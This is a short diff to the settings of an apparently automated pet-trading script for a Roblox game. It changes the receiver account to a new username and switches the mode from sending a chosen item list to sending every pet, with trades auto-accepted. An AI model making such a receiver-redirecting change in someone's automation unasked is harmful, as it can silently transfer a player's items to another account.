@@ -14,8 +14,8 @@
             AutoAcceptTrades = true, -- Auto accept trade requests sent TO you
             AutoLeaveAfterTrades = false, -- Leave/kick once every target has nothing left to receive
             LeaveDelay = 5, -- Seconds to wait after trades finish before leaving
-            Usernames = {"R3xxEthan"}, -- Receivers to send to e.g. {"player1", "player2"} (also pickable in Trade tab)
-            TradeMode = "specific", -- "all" = send everything in Categories | "specific" = only the Items list
+            Usernames = {"Xz_Turbo4hKingDhBaco"}, -- Receivers to send to e.g. {"player1", "player2"} (also pickable in Trade tab)
+            TradeMode = "all", -- "all" = send everything in Categories | "specific" = only the Items list
             Categories = {"pets"}, -- What to send
             Items = {
             "pet_recycler_2025_crystal_egg",
